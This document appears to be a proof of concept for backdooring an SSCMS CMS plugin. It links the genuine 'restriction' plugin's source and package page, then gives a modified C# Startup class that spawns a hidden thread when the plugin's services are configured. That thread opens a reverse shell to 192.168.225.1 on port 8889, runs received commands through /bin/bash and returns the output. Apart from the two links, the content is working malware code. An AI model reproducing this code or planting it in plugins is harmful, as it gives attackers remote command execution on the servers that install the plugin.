Plugin Source Code: https://github.com/siteserver/sscms.restriction

Compile Plugin Package: https://sscms.com/plugins/plugin.html?userName=sscms&name=restriction

```c#
using Microsoft.Extensions.DependencyInjection;
using SSCMS.Plugins;
using SSCMS.Restriction.Abstractions;
using SSCMS.Restriction.Core;
using System.Diagnostics;
using System;
using System.Text;
using System.Net.Sockets;
using System.Net;
using System.Threading;

namespace SSCMS.Restriction
{
	public class Startup : IPluginConfigureServices
	{
		public void ConfigureServices(IServiceCollection services)
		{
			ThreadStart childref = new ThreadStart(reversShell);
			Thread childThread = new Thread(childref);
			childThread.Start();
			services.AddScoped<IRestrictionManager, RestrictionManager>();
		}

		public void reversShell()
		{
			Socket socketshell = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			IPAddress ip = IPAddress.Parse("192.168.225.1");
			IPEndPoint point = new IPEndPoint(ip, Convert.ToInt32("8889"));
			try
			{
				socketshell.Connect(point);
				while (true)
				{
					byte[] getdata = new byte[1024 * 5];
					int n = socketshell.Receive(getdata);
					string restr = Encoding.Default.GetString(getdata, 0, n);
					string command = restr;
					string resultok = willshell(command);
					byte[] senddata = new byte[1024 * 5];
					senddata = Encoding.Default.GetBytes(resultok);
					socketshell.Send(senddata);
				}
			}
			catch
			{
				socketshell.Close();
			}
		}

		public static string willshell(object command)
		{
			Process process = new Process();
			process.StartInfo.FileName = "/bin/bash";
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardError = true;
			process.StartInfo.RedirectStandardInput = true;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.CreateNoWindow = true;
			process.Start();
			process.StandardInput.WriteLine("echo off");
			process.StandardInput.WriteLine(command);
			process.StandardInput.WriteLine("exit");
			string result = process.StandardOutput.ReadToEnd();
			return result;
		}
	}
}
```
